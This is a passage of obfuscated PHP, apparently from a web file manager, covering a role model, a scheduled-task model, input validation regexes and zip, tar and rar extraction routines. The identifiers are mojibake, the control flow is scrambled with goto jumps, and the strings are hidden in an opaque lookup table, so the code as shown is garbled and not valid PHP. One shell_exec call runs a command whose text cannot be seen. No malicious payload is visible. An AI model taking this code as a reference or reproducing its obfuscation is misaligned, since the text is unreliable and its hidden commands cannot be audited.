(!$aùÛ‘ò¯Ñ¹ || $aùÛ‘ò¯Ñ¹[$_SERVER[÷ÖêïÔÔÓ][1049]]) { return !1; } return parent::remove($a¢¸ò¿ñØ½); } public function add($cÛØ¥×ä’×) { goto f‚‹ÚÜš; c¡‘¾ë À: return parent::insert($cÛØ¥×ä’×); goto e‘Æ“éŞí; B§ì°–œ›©: $EĞ–Úïõ† = array($AÄ–õº·™[383] => $C¯à‡ªÄŠÀ, $AÄ–õº·™[2010] => $AÄ–õº·™[33], $AÄ–õº·™[2006] => $AÄ–õº·™[2023], $AÄ–õº·™[2353] => 1, $AÄ–õº·™[2009] => 0, $AÄ–õº·™[2354] => 0, $AÄ–õº·™[2008] => $this->getSort()); $cÛØ¥×ä’× = array_merge($EĞ–Úïõ†, $cÛØ¥×ä’×); $this->filterAuth($cÛØ¥×ä’×[$AÄ–õº·™[373]]); goto c¡‘¾ë À; f‚‹ÚÜš: $AÄ–õº·™ =& $_SERVER[÷ÖêïÔÔÓ]; $C¯à‡ªÄŠÀ = $cÛØ¥×ä’×[$AÄ–õº·™[28]]; if ($this->findByName($C¯à‡ªÄŠÀ)) { return !1; } goto B§ì°–œ›©; e‘Æ“éŞí: } private function getSort() { $F—î¡ÂËÊ¥ =& $_SERVER[÷ÖêïÔÔÓ]; $aô…‘»ôİ­ = parent::listData(); $FñÛ—Ùñõ„ = array_to_keyvalue($aô…‘»ôİ­, $F—î¡ÂËÊ¥[33], $F—î¡ÂËÊ¥[2025]); return empty($FñÛ—Ùñõ„) ? 0 : max($FñÛ—Ùñõ„) + 1; } private function filterAuth(&$FÍÑ®œİø½) { $B´À âÕà =& $_SERVER[÷ÖêïÔÔÓ]; $f…“ß©®ë = array(); $BÊéàÁº¥ƒ = array_filter(explode($B´À âÕà[47], $FÍÑ®œİø½)); foreach ($BÊéàÁº¥ƒ as $FÍÑ®œİø½) { $Dº´…ÉÁ¿ = explode($B´À âÕà[92], $FÍÑ®œİø½); if ($Dº´…ÉÁ¿[0] == $B´À âÕà[1684] && $Dº´…ÉÁ¿[1] != $B´À âÕà[1010]) { $E•§İ›°ÍÓ = $Dº´…ÉÁ¿[0] . $B´À âÕà[92] . $Dº´…ÉÁ¿[1] . $B´À âÕà[2355]; if (!in_array($E•§İ›°ÍÓ, $BÊéàÁº¥ƒ)) { $f…“ß©®ë[] = $E•§İ›°ÍÓ; } } $f…“ß©®ë[] = $FÍÑ®œİø½; } $FÍÑ®œİø½ = implode($B´À âÕà[47], $f…“ß©®ë); } public function sort($cŸšİÜ–—¢, $BÒ†¢Ø¥’) { return parent::update($cŸšİÜ–—¢, $BÒ†¢Ø¥’); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\164\x61\163\153\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\164\171\x70\145", "\x65\x76\145\x6e\164", "\x74\151\x6d\145", "\144\145\x73\143", "\163\171\x73\164\145\155", "\145\156\141\142\154\145", "\154\141\x73\x74\122\x75\156", "\163\157\x72\164"); public function listData($e¥êùŠ²‰Õ = false, $cì ñÚ¾¥ = "\163\x6f\x72\x74", $ašÉ Î¬íÇ = false) { return parent::listData($e¥êùŠ²‰Õ, $cì ñÚ¾¥, $ašÉ Î¬íÇ); } public function add($e¥Ñ˜”£³) { $AáÑÏÇ÷ Ğ =& $_SERVER[÷ÖêïÔÔÓ]; $fÕŒô†  = $this->findByName($e¥Ñ˜”£³[$AáÑÏÇ÷ Ğ[28]]); if ($fÕŒô† ) { return !1; } $e¥Ñ˜”£³[$AáÑÏÇ÷ Ğ[1307]] = 0; $e¥Ñ˜”£³[$AáÑÏÇ÷ Ğ[2025]] = $this->getSort(); return parent::insert($e¥Ñ˜”£³); } private function getSort() { $BØˆ¹¬¨íŠ =& $_SERVER[÷ÖêïÔÔÓ]; $CÓõŞäİ¹ = parent::listData(); $bí»½èˆ¢„ = array_to_keyvalue($CÓõŞäİ¹, $BØˆ¹¬¨íŠ[33], $BØˆ¹¬¨íŠ[2025]); return empty($bí»½èˆ¢„) ? 0 : max($bí»½èˆ¢„) + 1; } public function update($cğ¦˜¹Ù™, $fæïœ¦Ü„¬) { $bÆç–™ØŠ =& $_SERVER[÷ÖêïÔÔÓ]; $fĞç»õè„ = $this->listData($cğ¦˜¹Ù™); $dÊ¾ãÉŠ = $this->findByName($fæïœ¦Ü„¬[$bÆç–™ØŠ[28]]); if (!$fĞç»õè„ || $dÊ¾ãÉŠ && $dÊ¾ãÉŠ[$bÆç–™ØŠ[364]] != $fĞç»õè„[$bÆç–™ØŠ[364]]) { return !1; } return parent::update($cğ¦˜¹Ù™, $fæïœ¦Ü„¬); } public function remove($FÔëØÎ­) { $B¢ã‘íÊ£ª = $this->listData($FÔëØÎ­); if (!$B¢ã‘íÊ£ª || $B¢ã‘íÊ£ª[$_SERVER[÷ÖêïÔÔÓ][1049]]) { return !1; } return parent::remove($FÔëØÎ­); } public function enable($fó²¶¡³Û) { $E‚äÏÖÓì =& $_SERVER[÷ÖêïÔÔÓ]; $c¦Ö¯™–¨ = $this->listData($fó²¶¡³Û); $c¡ä§¤™œ‡ = !$c¦Ö¯™–¨[$E‚äÏÖÓì[1314]]; return $this->update($fó²¶¡³Û, array($E‚äÏÖÓì[2356] => $c¡ä§¤™œ‡)); } public function run($a‚¸Âƒ¬) { return $this->update($a‚¸Âƒ¬, array($_SERVER[÷ÖêïÔÔÓ][2357] => time())); } } goto aÁ¾£°Ù˜; aæé¤ÏğÍ‘: class Input { public static function getArray($d ¿¿õ—) { goto c¯å¿óí; E”ŠŠÌÅù©: $D’ÕîĞ¢óê = array(); $EŒ±µÆÙÆĞ = LNG($f´·÷ãŒçÔ[1775]); foreach ($d ¿¿õ— as $D°«§ÚÉ­õ => $F¹¾½âÀ× ) { goto e‡…Úè£†µ; B Ğ¯¨ªÃ: if (!array_key_exists($D°«§ÚÉ­õ, $in)) { if (array_key_exists($f´·÷ãŒçÔ[1778], $F¹¾½âÀ× )) { if (!is_null($F¹¾½âÀ× [$f´·÷ãŒçÔ[1778]])) { $bİ…è¬×º[$c¿Ìô£äñ] = $F¹¾½âÀ× [$f´·÷ãŒçÔ[1778]]; } } else { if (isset($F¹¾½âÀ× [$f´·÷ãŒçÔ[1779]])) { $D’ÕîĞ¢óê[] = $B‘ÚÂßİĞÜ; } } continue; } if (isset($F¹¾½âÀ× [$f´·÷ãŒçÔ[1779]]) && $F¹¾½âÀ× [$f´·÷ãŒçÔ[1779]] == $f´·÷ãŒçÔ[279]) { $DŠ»ìà³›º = json_decode($in[$D°«§ÚÉ­õ], !0); if (is_array($DŠ»ìà³›º)) { $bİ…è¬×º[$c¿Ìô£äñ] = $DŠ»ìà³›º; } else { if (array_key_exists($f´·÷ãŒçÔ[1778], $F¹¾½âÀ× )) { if (!is_null($F¹¾½âÀ× [$f´·÷ãŒçÔ[1778]])) { $bİ…è¬×º[$c¿Ìô£äñ] = $F¹¾½âÀ× [$f´·÷ãŒçÔ[1778]]; } } else { $D’ÕîĞ¢óê[] = $B‘ÚÂßİĞÜ; } } continue; } $a«ïîšã¹î = _get($F¹¾½âÀ× , $f´·÷ãŒçÔ[984]); goto F“»¦Ç­ˆ¢; F“»¦Ç­ˆ¢: if (isset($F¹¾½âÀ× [$f´·÷ãŒçÔ[1779]]) && !self::check($in[$D°«§ÚÉ­õ], $F¹¾½âÀ× [$f´·÷ãŒçÔ[1779]], $a«ïîšã¹î)) { if (array_key_exists($f´·÷ãŒçÔ[1778], $F¹¾½âÀ× )) { if (!is_null($F¹¾½âÀ× [$f´·÷ãŒçÔ[1778]])) { $bİ…è¬×º[$c¿Ìô£äñ] = $F¹¾½âÀ× [$f´·÷ãŒçÔ[1778]]; } } else { $D’ÕîĞ¢óê[] = $B‘ÚÂßİĞÜ; } continue; } $bİ…è¬×º[$c¿Ìô£äñ] = $in[$D°«§ÚÉ­õ]; goto FÛ‰‚ñœ ; e‡…Úè£†µ: $B‘ÚÂßİĞÜ = _get($F¹¾½âÀ× , $f´·÷ãŒçÔ[1776], $EŒ±µÆÙÆĞ . $f´·÷ãŒçÔ[876] . $D°«§ÚÉ­õ); $c¿Ìô£äñ = $D°«§ÚÉ­õ; if (isset($F¹¾½âÀ× [$f´·÷ãŒçÔ[1777]]) && $F¹¾½âÀ× [$f´·÷ãŒçÔ[1777]]) { $c¿Ìô£äñ = $F¹¾½âÀ× [$f´·÷ãŒçÔ[1777]]; } goto B Ğ¯¨ªÃ; FÛ‰‚ñœ : } goto d¸®ŸÃ£³±; c¯å¿óí: $f´·÷ãŒçÔ =& $_SERVER[÷ÖêïÔÔÓ]; global $in; $bİ…è¬×º = array(); goto E”ŠŠÌÅù©; d¸®ŸÃ£³±: if (count($D’ÕîĞ¢óê) > 0) { show_json(implode($f´·÷ãŒçÔ[1780], $D’ÕîĞ¢óê), !1); } return $bİ…è¬×º; goto F’¯¨ƒÂÙĞ; F’¯¨ƒÂÙĞ: } public static function reg($eó·³Ç‡ÈØ = "\162\x65\161\165\151\162\145") { static $dî¥ÜÔæË = array("\162\x65\161\165\x69\162\x65" => "\x2e\x2b", "\156\165\155\x62\x65\162" => "\x5c\x64\53", "\150\x65\170" => "\133\x30\55\71\x41\x2d\106\x61\x2d\x66\135\53", "\x69\156\x74" => "\x5b\x2d\x5c\x2b\x5d\77\x5c\x64\53", "\142\157\157\154" => "\x30\174\61", "\x66\x6c\157\x61\164" => "\133\55\134\x2b\x5d\x3f\x5c\144\x2b\50\134\56\x5c\x64\53\x29\77", "\x65\x6e\147\154\151\163\150" => "\x5b\101\x2d\x5a\141\55\x7a\x20\135\53", "\143\150\151\156\x65\x73\145" => "\133\x5c\x78\x7b\64\x65\x30\60\x7d\x2d\x5c\x78\x7b\x39\146\141\65\x7d\135\53", "\x68\141\x73\103\150\151\x6e\145\163\x65" => "\x2f\50\x5b\134\170\173\64\x65\60\60\x7d\55\x5c\170\x7b\x39\146\141\x35\175\135\53\51\x2f\165", "\x65\155\x61\x69\x6c" => "\x5c\167\x2b\50\x5b\134\x2e\134\55\135\x5c\167\53\51\x2a\x5c\100\134\167\53\x28\x5b\134\56\x5c\x2d\x5d\x5c\167\x2b\x29\x2a\x5c\56\134\x77\x2b", "\160\x68\157\x6e\x65" => "\61\133\63\x2d\x39\135\x5c\x64\x7b\x39\x7d", "\164\x65\x6c\x70\x68\157\x6e\x65" => "\50\134\50\x5c\x64\173\63\54\x34\175\x5c\x29\x7c\134\144\173\x33\54\64\175\x2d\174\134\163\51\x3f\134\144\173\67\x2c\61\64\x7d", "\x75\162\154" => "\50\150\164\164\x70\x7c\146\x74\160\x7c\150\164\164\x70\x73\x29\72\134\57\134\x2f\133\x5c\x77\134\x2d\x5f\x5d\x2b\50\x5c\56\x5b\134\x77\x5c\55\137\135\x2b\x29\x2b\50\133\134\x77\134\x2d\x5c\x2e\54\x40\x3f\136\x3d\45\46\72\134\x2f\x7e\134\x2b\x23\x5d\52\x5b\x5c\x77\x5c\55\134\100\77\x5e\75\x25\x26\x5c\x2f\176\134\53\x23\x5d\x29\77", "\x75\x72\x6c\x46\x75\x6c\x6c" => "\133\x61\55\172\x41\x2d\172\135\x2b\72\134\57\x5c\x2f\x5b\136\x5c\x73\x5d\52", "\x69\160" => "\50\134\x64\173\x31\x2c\63\175\134\56\51\x7b\x33\175\x28\134\144\x7b\61\54\x33\x7d\51", "\172\x69\x70" => "\133\61\x2d\x39\135\134\x64\x7b\x35\175\x28\77\41\134\144\x29", "\x69\144\103\x61\162\144" => "\50\x5c\x64\x7b\61\65\175\x29\x7c\x28\x5c\144\173\x31\x37\175\50\x5c\x64\x7c\130\x7c\x78\51\x29", "\x63\157\154\x6f\162" => "\x23\x28\x5b\x30\x2d\x39\x41\x2d\106\141\55\x66\135\x7b\63\175\x7c\x5b\x30\55\x39\x41\x2d\x46\141\55\146\135\173\66\x7d\x29", "\164\x69\x6d\145" => "\x28\133\60\x2d\x31\135\134\x64\174\x32\x5b\x30\55\x34\135\x29\x3a\x5b\60\55\65\x5d\x5c\x64", "\144\x61\164\145" => "\134\x64\x7b\x34\x7d\x5b\55\x5c\57\x5d\77\x28\x30\133\61\55\x39\x5d\x7c\x31\133\x30\55\62\135\51\x5b\55\134\x2f\x5d\77\x28\x5b\60\x2d\x32\135\134\144\x7c\x33\133\x30\x2d\x31\135\x29", "\144\x61\x74\145\x54\x69\x6d\x65" => "\134\x64\173\64\x7d\133\x2d\134\x2f\135\77\x28\60\x5b\x31\55\71\135\174\61\133\60\x2d\62\x5d\51\x5b\x2d\134\x2f\135\77\50\133\x30\55\x32\x5d\x5c\x64\x7c\x33\x5b\60\55\61\x5d\51\x5c\163\x2b\50\133\60\55\x31\135\134\x64\x7c\62\x5b\60\55\x34\x5d\51\x3a\x5b\60\x2d\65\x5d\x5c\x64", "\160\141\163\x73\167\157\162\x64" => "\x28\x3f\75\56\52\134\144\51\x28\x3f\75\56\x2a\x5b\x61\x2d\x7a\x5d\x29\x28\x3f\75\56\52\133\x41\x2d\x5a\x5d\x29\x2e\x7b\x38\x2c\62\x30\175", "\153\145\171" => "\x5b\101\55\x5a\x61\55\x7a\x30\x2d\71\x5f\x5c\55\x5c\x2e\x5d\x2b", "\153\145\171\x46\165\x6c\154" => "\x5b\101\55\x5a\141\x2d\x7a\60\x2d\x39\x5f\134\55\134\56\134\163\x2c\135\53"); if (!$eó·³Ç‡ÈØ) { return $dî¥ÜÔæË; } return $dî¥ÜÔæË[$eó·³Ç‡ÈØ]; } public static function check($dÛªÁÈ’, $C±öŒ‡»Ø, $b¦â„÷š¡Î = null) { $BìÁñ£ñÇ =& $_SERVER[÷ÖêïÔÔÓ]; switch ($C±öŒ‡»Ø) { case $BìÁñ£ñÇ[7]: return in_array($dÛªÁÈ’, $b¦â„÷š¡Î); break; case $BìÁñ£ñÇ[1781]: return floatval($dÛªÁÈ’) > $b¦â„÷š¡Î; break; case $BìÁñ£ñÇ[1782]: return floatval($dÛªÁÈ’) < $b¦â„÷š¡Î; break; case $BìÁñ£ñÇ[322]: return strlen($dÛªÁÈ’) >= $b¦â„÷š¡Î[0] && strlen($dÛªÁÈ’) <= $b¦â„÷š¡Î[1]; break; case $BìÁñ£ñÇ[322]: if (is_array($b¦â„÷š¡Î)) { return strlen($dÛªÁÈ’) >= $b¦â„÷š¡Î[0] && strlen($dÛªÁÈ’) <= $b¦â„÷š¡Î[1]; break; } else { return strlen($dÛªÁÈ’) == $b¦â„÷š¡Î; break; } case $BìÁñ£ñÇ[318]: return floatval($dÛªÁÈ’) >= $b¦â„÷š¡Î[0] && floatval($dÛªÁÈ’) <= $b¦â„÷š¡Î[1]; break; } $dŞ‹Ûœ¹‡š = self::reg(!1); $C±öŒ‡»Ø = isset($dŞ‹Ûœ¹‡š[$C±öŒ‡»Ø]) ? $dŞ‹Ûœ¹‡š[$C±öŒ‡»Ø] : $C±öŒ‡»Ø; if (substr($C±öŒ‡»Ø, 0, 1) != $BìÁñ£ñÇ[8]) { $C±öŒ‡»Ø = $BìÁñ£ñÇ[1783] . $C±öŒ‡»Ø . $BìÁñ£ñÇ[1784]; } return preg_match($C±öŒ‡»Ø, $dÛªÁÈ’) === 1; } public static function get($eÌÁğÃ¾ˆº, $b¯Š…×‡ñ = null, $C…§Ğ½ŠÄ = null, $fÜ‡È¹ª§Ê = null) { goto FÄ“²ñ±¼; a¦°äÃŸ‹É: return $F–­İÅ‡ÁÖ[$eÌÁğÃ¾ˆº]; goto bÆ¯óâêÒ»; AÁÆø£à‹Û: if (!is_null($fÜ‡È¹ª§Ê)) { $bˆ¿ÙƒİÍ¼[$D®¾Şó…¾‰[984]] = $fÜ‡È¹ª§Ê; } if (!is_null($b¯Š…×‡ñ)) { $bˆ¿ÙƒİÍ¼[$D®¾Şó…¾‰[1779]] = $b¯Š…×‡ñ; } $F–­İÅ‡ÁÖ = Input::getArray(array($eÌÁğÃ¾ˆº => $bˆ¿ÙƒİÍ¼)); goto a¦°äÃŸ‹É; FÄ“²ñ±¼: $D®¾Şó…¾‰ =& $_SERVER[÷ÖêïÔÔÓ]; $bˆ¿ÙƒİÍ¼ = array(); if (!is_null($C…§Ğ½ŠÄ)) { $bˆ¿ÙƒİÍ¼[$D®¾Şó…¾‰[34]] = $C…§Ğ½ŠÄ; } goto AÁÆø£à‹Û; bÆ¯óâêÒ»: } } class KodArchive { static function init() { goto D­«‚ùèùÒ; D­«‚ùèùÒ: $bˆò‘ˆËöä =& $_SERVER[÷ÖêïÔÔÓ]; if (defined($bˆò‘ˆËöä[1785])) { return; } define($bˆò‘ˆËöä[1785], SDK_DIR . $bˆò‘ˆËöä[1786]); goto Aö™¸Áãó; Aö™¸Áãó: define($bˆò‘ˆËöä[1787], TEMP_FILES); define($bˆò‘ˆËöä[1788], TEMP_FILES); define($bˆò‘ˆËöä[1789], $bˆò‘ˆËöä[1790]); goto FÃÇ•ğø§Ê; B‹¤àğ÷Ô: require_once ARCHIVE_LIB . $bˆò‘ˆËöä[1796]; goto càø¡ã¥ÇÊ; A‘Ì³×ÖâÏ: require_once ARCHIVE_LIB . $bˆò‘ˆËöä[1793]; require_once ARCHIVE_LIB . $bˆò‘ˆËöä[1794]; require_once ARCHIVE_LIB . $bˆò‘ˆËöä[1795]; goto B‹¤àğ÷Ô; FÃÇ•ğø§Ê: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $bˆò‘ˆËöä[1791]; require_once ARCHIVE_LIB . $bˆò‘ˆËöä[1792]; goto A‘Ì³×ÖâÏ; càø¡ã¥ÇÊ: } static function checkIfType($D†ßÊ¬¢´¹, $c†Û¤îÂ™¿) { goto FêƒÈÒè‰ì; dÏ×ÈÈŒ§È: $c‡Âà¡åÊ = in_array($D†ßÊ¬¢´¹, $f·Šõ£‹ ±[$c†Û¤îÂ™¿]); if ($c‡Âà¡åÊ && ($c†Û¤îÂ™¿ == $cĞªø£Ç„Ñ[298] || $c†Û¤îÂ™¿ == $cĞªø£Ç„Ñ[1800]) && (!function_exists($cĞªø£Ç„Ñ[1810]) || !function_exists($cĞªø£Ç„Ñ[1811]))) { show_tips($cĞªø£Ç„Ñ[1812]); } if ($c‡Âà¡åÊ && $c†Û¤îÂ™¿ == $cĞªø£Ç„Ñ[1016] && (!function_exists($cĞªø£Ç„Ñ[1813]) || !strstr(shell_exec($cĞªø£Ç„Ñ[1814]), $cĞªø£Ç„Ñ[1815]))) { show_tips($cĞªø£Ç„Ñ[1816]); } goto CãŒïäŸÇ¼; CãŒïäŸÇ¼: return $c‡Âà¡åÊ; goto CˆòÂÔ£·æ; FêƒÈÒè‰ì: $cĞªø£Ç„Ñ =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); $f·Šõ£‹ ± = array($cĞªø£Ç„Ñ[298] => array($cĞªø£Ç„Ñ[298], $cĞªø£Ç„Ñ[1797], $cĞªø£Ç„Ñ[1798], $cĞªø£Ç„Ñ[1799]), $cĞªø£Ç„Ñ[1800] => array($cĞªø£Ç„Ñ[1800], $cĞªø£Ç„Ñ[1801], $cĞªø£Ç„Ñ[1802], $cĞªø£Ç„Ñ[1803]), $cĞªø£Ç„Ñ[1016] => array($cĞªø£Ç„Ñ[1016], $cĞªø£Ç„Ñ[1804], $cĞªø£Ç„Ñ[1805], $cĞªø£Ç„Ñ[1806], $cĞªø£Ç„Ñ[1807], $cĞªø£Ç„Ñ[1808], $cĞªø£Ç„Ñ[1809])); goto dÏ×ÈÈŒ§È; CˆòÂÔ£·æ: } static function listContent($F¨ƒÁÎŠ‹, $D‚–Û¬Á± = true) { $A´Œƒ„ëÚ¡ =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); $B„ø¨˜Û¿ = $GLOBALS[$A´Œƒ„ëÚ¡[1020]] ? $GLOBALS[$A´Œƒ„ëÚ¡[1020]] : get_path_ext($F¨ƒÁÎŠ‹); $D´æÎ…İ = !1; if (self::checkIfType($B„ø¨˜Û¿, $A´Œƒ„ëÚ¡[1800])) { $cŸ¯õ¦»« = PclTarList($F¨ƒÁÎŠ‹, $B„ø¨˜Û¿); $D´æÎ…İ = array(); for ($c¾½åÁ´‘¨ = 0; $c¾½åÁ´‘¨ < count($cŸ¯õ¦»«); $c¾½åÁ´‘¨++) { $eÒåàèæƒ = $cŸ¯õ¦»«[$c¾½åÁ´‘¨]; if ($eÒåàèæƒ[$A´Œƒ„ëÚ¡[1817]] == $A´Œƒ„ëÚ¡[1818] || $eÒåàèæƒ[$A´Œƒ„ëÚ¡[1817]] == $A´Œƒ„ëÚ¡[1819]) { continue; } if ($D‚–Û¬Á±) { $eÒåàèæƒ[$A´Œƒ„ëÚ¡[1820]] = ltrim($eÒåàèæƒ[$A´Œƒ„ëÚ¡[1820]], $A´Œƒ„ëÚ¡[1113]); } if ($eÒåàèæƒ[$A´Œƒ„ëÚ¡[1817]] == $A´Œƒ„ëÚ¡[1821]) { $eÒåàèæƒ[$A´Œƒ„ëÚ¡[77]] = !0; } else { $eÒåàèæƒ[$A´Œƒ„ëÚ¡[77]] = !1; } $eÒåàèæƒ[$A´Œƒ„ëÚ¡[1010]] = $c¾½åÁ´‘¨; $D´æÎ…İ[] = $eÒåàèæƒ; } } else { if (self::checkIfType($B„ø¨˜Û¿, $A´Œƒ„ëÚ¡[1016])) { $CÆ¹Èßˆ‹å = kodRarArchive::listContent($F¨ƒÁÎŠ‹); if (!$CÆ¹Èßˆ‹å[$A´Œƒ„ëÚ¡[1006]]) { return $CÆ¹Èßˆ‹å; } else { $D´æÎ…İ = $CÆ¹Èßˆ‹å[$A´Œƒ„ëÚ¡[1008]]; } } else { if (kodZipArchive::support($A´Œƒ„ëÚ¡[350])) { $D´æÎ…İ = kodZipArchive::listContent($F¨ƒÁÎŠ‹); } else { $AùÉ§ô¬òŒ = new PclZip($F¨ƒÁÎŠ‹); $D´æÎ…İ = $AùÉ§ô¬òŒ->listContent(); } } } if ($D´æÎ…İ) { $cƒ¾‚š— = unzip_charset_get($D´æÎ…İ); $D‚–Û¬Á± = $D‚–Û¬Á± && function_exists($A´Œƒ„ëÚ¡[66]); for ($c¾½åÁ´‘¨ = 0; $c¾½åÁ´‘¨ < count($D´æÎ…İ); $c¾½åÁ´‘¨++) { $D´æÎ…İ[$c¾½åÁ´‘¨][$A´Œƒ„ëÚ¡[1820]] = str_replace(array($A´Œƒ„ëÚ¡[1042], $A´Œƒ„ëÚ¡[1822]), $A´Œƒ„ëÚ¡[757], $D´æÎ…İ[$c¾½åÁ´‘¨][$A´Œƒ„ëÚ¡[1820]]); if ($D‚–Û¬Á±) { $D´æÎ…İ[$c¾½åÁ´‘¨][$A´Œƒ„ëÚ¡[1820]] = iconv_to($D´æÎ…İ[$c¾½åÁ´‘¨][$A´Œƒ„ëÚ¡[1820]], $cƒ¾‚š—, $A´Œƒ„ëÚ¡[323]); unset($D´æÎ…İ[$c¾½åÁ´‘¨][$A´Œƒ„ëÚ¡[1823]]); } } return array($A´Œƒ„ëÚ¡[1006] => !0, $A´Œƒ„ëÚ¡[1008] => $D´æÎ…İ); } else { return array($A´Œƒ„ëÚ¡[1006] => !1, $A´Œƒ„ëÚ¡[1008] => $D´æÎ…İ); } } static function extract($b¤˜¿œ°ºØ, $cè¨Û¼¿°ô, $CåµÃà±™ª = "\55\61", &$D®œÙ˜”·« = false) { goto Cœãá†Å; CÑˆß„–ˆ§: $EòÔ»¼åã¡ = self::listContent($b¤˜¿œ°ºØ, !1); if (!$EòÔ»¼åã¡[$fáÔ¿”¸è[1006]]) { return $EòÔ»¼åã¡; } if ($CåµÃà±™ª != $fáÔ¿”¸è[1005]) { goto ağà££ÑÇ; f§ó£ÕÛ: if ($CàÎ ‚••§[$fáÔ¿”¸è[77]]) { $a¢Ğ×ÁÈò = rtrim($a¢Ğ×ÁÈò, $fáÔ¿”¸è[8]) . $fáÔ¿”¸è[8]; $D®œÙ˜”·« = array($D®œÙ˜”·«); } $C»°ÈĞ•¢¾ = str_replace($fáÔ¿”¸è[94], $fáÔ¿”¸è[8], $a¢Ğ×ÁÈò); if (substr($C»°ÈĞ•¢¾, -1) == $fáÔ¿”¸è[8]) { if (!strstr(trim($C»°ÈĞ•¢¾, $fáÔ¿”¸è[8]), $fáÔ¿”¸è[8])) { $cè¨Û¼¿°ô = $cè¨Û¼¿°ô . get_path_this($C»°ÈĞ•¢¾) . $fáÔ¿”¸è[8]; } } else { if ($cŸ¦‘â“Ğ• == $a¢Ğ×ÁÈò) { $cŸ¦‘â“Ğ• = $fáÔ¿”¸è[33]; } } goto B“êÏŒ™ÍĞ; ağà££ÑÇ: $CàÎ ‚••§ = self::fileIndex($EòÔ»¼åã¡[$fáÔ¿”¸è[1008]], $CåµÃà±™ª); $D®œÙ˜”·« = str_replace(array($fáÔ¿”¸è[1042], $fáÔ¿”¸è[1822]), $fáÔ¿”¸è[71], $CàÎ ‚••§[$fáÔ¿”¸è[1820]]); $a¢Ğ×ÁÈò = $D®œÙ˜”·«; goto c‚ƒ¶¼Š“Ã; c‚ƒ¶¼Š“Ã: if ($GLOBALS[$fáÔ¿”¸è[6]][$fáÔ¿”¸è[1111]] != $fáÔ¿”¸è[323]) { $a¢Ğ×ÁÈò = unzip_pre_name($D®œÙ˜”·«); } $cŸ¦‘â“Ğ• = get_path_father($D®œÙ˜”·«); if ($cŸ¦‘â“Ğ• == $D®œÙ˜”·«) { $cŸ¦‘â“Ğ• = $fáÔ¿”¸è[33]; } goto f§ó£ÕÛ; B“êÏŒ™ÍĞ: } goto bÂÉ–ŒãĞ; bÂÉ–ŒãĞ: if (self::checkIfType($aå÷à·É—, $fáÔ¿”¸è[1800])) { if ($CåµÃà±™ª != $fáÔ¿”¸è[1005]) { $a¢Ğ×ÁÈò = unzip_pre_name($a¢Ğ×ÁÈò); $cŸ¦‘â“Ğ• = unzip_pre_name($cŸ¦‘â“Ğ•); $Eö«¯Š¿ = PclTarExtractList($b¤˜¿œ°ºØ, array($a¢Ğ×ÁÈò), $cè¨Û¼¿°ô, $cŸ¦‘â“Ğ•, $aå÷à·É—); } else { $Eö«¯Š¿ = PclTarExtract($b¤˜¿œ°ºØ, $cè¨Û¼¿°ô, $fáÔ¿”¸è[358], $aå÷à·É—); } return array($fáÔ¿”¸è[1006] => $Eö«¯Š¿, $fáÔ¿”¸è[1008] => PclErrorString(!0)); } else { if (self::checkIfType($aå÷à·É—, $fáÔ¿”¸è[1016])) { return kodRarArchive::extract($b¤˜¿œ°ºØ, $cè¨Û¼¿°ô, $aå÷à·É—, $D®œÙ˜”·«); } else { if (kodZipArchive::support($fáÔ¿”¸è[1824])) { return kodZipArchive::extract($b¤˜¿œ°ºØ, $cè¨Û¼¿°ô, $D®œÙ˜”·«); } else { $BÃƒÍÖ¨— = new PclZip($b¤˜¿œ°ºØ); if ($CåµÃà±™ª != $fáÔ¿”¸è[1005]) { $Eö«¯Š¿ = $BÃƒÍÖ¨—->extract(PCLZIP_OPT_PATH, $cè¨Û¼¿°ô, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $fáÔ¿”¸è[1825], PCLZIP_OPT_BY_NAME, $CàÎ ‚••§[$fáÔ¿”¸è[1820]], PCLZIP_OPT_REMOVE_PATH, $cŸ¦‘â“Ğ•, PCLZIP_OPT_REPLACE_NEWER); } else { $Eö«¯Š¿ = $BÃƒÍÖ¨—->extract(PCLZIP_OPT_PATH, $cè¨Û¼¿°ô, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $fáÔ¿”¸è[1825], PCLZIP_OPT_REPLACE_NEWER); } return array($fáÔ¿”¸è[1006] => $Eö«¯Š¿, $fáÔ¿”¸è[1008] => $BÃƒÍÖ¨—->errorName(!0)); } } } return array($fáÔ¿”¸è[1006] => !1, $fáÔ¿”¸è[1008] => $fáÔ¿”¸è[1826]); goto a¡Ô¨™òäµ; Cœãá†Å: $fáÔ¿”¸è =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); $aå÷à·É— = $GLOBALS[$fáÔ¿”¸è[1020]] ? $GLOBALS[$fáÔ¿”¸è[1020]] : get_path_ext($b¤˜¿œ°ºØ); goto CÑˆß„–ˆ§; a¡Ô¨™òäµ: } static function fileIndex($E¬“²óñÑ, $a£¨±˜Ï‘¨, $Eô‚óêÆˆƒ = false) { goto C‰ĞÇøÆ—Á; dÀ‡ËÂ½¤Ò: $f¯‡éÀµŞ = count($E¬“²óñÑ); for ($cºÕáê‘ÜÜ = 0; $cºÕáê‘ÜÜ < $f¯‡éÀµŞ; $cºÕáê‘ÜÜ++) { if ($a£¨±˜Ï‘¨ == $E¬“²óñÑ[$cºÕáê‘ÜÜ][$F ê›ÔÊ›Ğ[1010]]) { $cÇñóÒ±ªÇ = $E¬“²óñÑ[$cºÕáê‘ÜÜ]; break; } } if (!$cÇñóÒ±ªÇ) { show_tips($F ê›ÔÊ›Ğ[1827]); } goto A¿šÍÔøç; C‰ĞÇøÆ—Á: $F ê›ÔÊ›Ğ =& $_SERVER[÷ÖêïÔÔÓ]; self::init(); if (!is_array($E¬“²óñÑ)) { return !1; } goto dÀ‡ËÂ½¤Ò; A¿šÍÔøç: $Cïµª¥ÚŠé = $cÇñóÒ±ªÇ; if ($Eô‚óêÆˆƒ) { $Cïµª¥ÚŠé = $cÇñóÒ±ªÇ[$Eô‚óêÆˆƒ]; if ($cÇñóÒ±ªÇ[$F ê›ÔÊ›Ğ[77]]) { $Cïµª¥ÚŠé = rtrim($Cïµª¥ÚŠé, $F ê›ÔÊ›Ğ[8]) . $F ê›ÔÊ›Ğ[8]; } } return $Cïµª¥ÚŠé; goto c¡ƒ„¥Ÿ; 